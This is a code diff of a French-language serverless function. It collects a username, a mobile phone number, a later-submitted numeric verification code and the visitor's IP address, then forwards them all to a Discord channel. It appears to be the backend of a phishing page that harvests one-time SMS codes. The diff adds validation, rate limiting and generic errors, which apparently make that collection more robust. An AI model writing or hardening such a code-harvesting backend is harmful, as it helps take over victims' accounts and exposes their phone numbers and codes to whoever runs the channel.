@@ -68,7 +68,11 @@ serve(async (req) => {
     const DISCORD_CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');
     
     if (!DISCORD_BOT_TOKEN || !DISCORD_CHANNEL_ID) {
-      throw new Error('Missing Discord configuration');
+      console.error('[CONFIG] Missing Discord env vars');
+      return new Response(JSON.stringify({ error: 'Une erreur est survenue. Veuillez réessayer.' }), {
+        status: 500,
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
     }
 
     const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
@@ -81,7 +85,56 @@ serve(async (req) => {
                      req.headers.get('x-real-ip') || 
                      'Inconnue';
 
-    const { username, phone, code, step, submissionId } = await req.json();
+    const body = await req.json().catch(() => ({}));
+    const { username, phone, code, step, submissionId } = body ?? {};
+
+    // Validation serveur
+    const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+    const isValidUsername = typeof username === 'string' && username.length >= 1 && username.length <= 50;
+    const isValidPhone = typeof phone === 'string' && /^0[67]\d{8}$/.test(phone);
+    const isValidStep = step === 'form' || step === 'code';
+
+    if (!isValidStep || !isValidUsername || !isValidPhone) {
+      return new Response(JSON.stringify({ error: 'Données invalides.' }), {
+        status: 400,
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
+    }
+    if (step === 'code') {
+      if (typeof code !== 'string' || !/^\d{4,8}$/.test(code)) {
+        return new Response(JSON.stringify({ error: 'Données invalides.' }), {
+          status: 400,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      }
+      if (typeof submissionId !== 'string' || !UUID_RE.test(submissionId)) {
+        return new Response(JSON.stringify({ error: 'Données invalides.' }), {
+          status: 400,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      }
+    }
+
+    // Sanitize Discord markdown injection
+    const sanitizeMd = (s: string) => s.replace(/[*_`~|\\[\]()@<>]/g, '').slice(0, 50);
+    const safeUsername = sanitizeMd(username);
+
+    // Rate limit par téléphone (max 3 soumissions form / heure)
+    if (step === 'form') {
+      const oneHourAgo = new Date(Date.now() - 3600_000).toISOString();
+      const { data: recent } = await supabase
+        .from('submissions')
+        .select('id')
+        .eq('phone', phone)
+        .gte('created_at', oneHourAgo)
+        .limit(5);
+      if (recent && recent.length >= 3) {
+        return new Response(JSON.stringify({ error: 'Trop de tentatives. Réessayez plus tard.' }), {
+          status: 429,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      }
+    }
 
     // Formater le numéro de téléphone avec drapeau français et +33
     const formatPhone = (p: string) => {
@@ -119,7 +172,7 @@ serve(async (req) => {
           },
           {
             name: "👤 Nom d'utilisateur",
-            value: `>>> **${username}**`,
+            value: `>>> **${safeUsername}**`,
             inline: false
           },
           {
@@ -216,7 +269,7 @@ serve(async (req) => {
           },
           {
             name: "👤 Nom d'utilisateur",
-            value: `>>> **${username}**`,
+            value: `>>> **${safeUsername}**`,
             inline: false
           },
           {
@@ -317,8 +370,11 @@ serve(async (req) => {
 
       if (!response.ok) {
         const errorText = await response.text();
-        console.error('Discord API error:', errorText);
-        throw new Error(`Discord API error: ${response.status}`);
+        console.error('[discord-webhook] Discord API error:', response.status, errorText);
+        return new Response(JSON.stringify({ error: 'Une erreur est survenue. Veuillez réessayer.' }), {
+          status: 500,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
       }
 
       return new Response(JSON.stringify({ success: true }), {
@@ -330,9 +386,8 @@ serve(async (req) => {
       headers: { ...corsHeaders, 'Content-Type': 'application/json' },
     });
   } catch (error: unknown) {
-    console.error('Error:', error);
-    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
-    return new Response(JSON.stringify({ error: errorMessage }), {
+    console.error('[discord-webhook] Error:', error);
+    return new Response(JSON.stringify({ error: 'Une erreur est survenue. Veuillez réessayer.' }), {
       status: 500,
       headers: { ...corsHeaders, 'Content-Type': 'application/json' },
     });
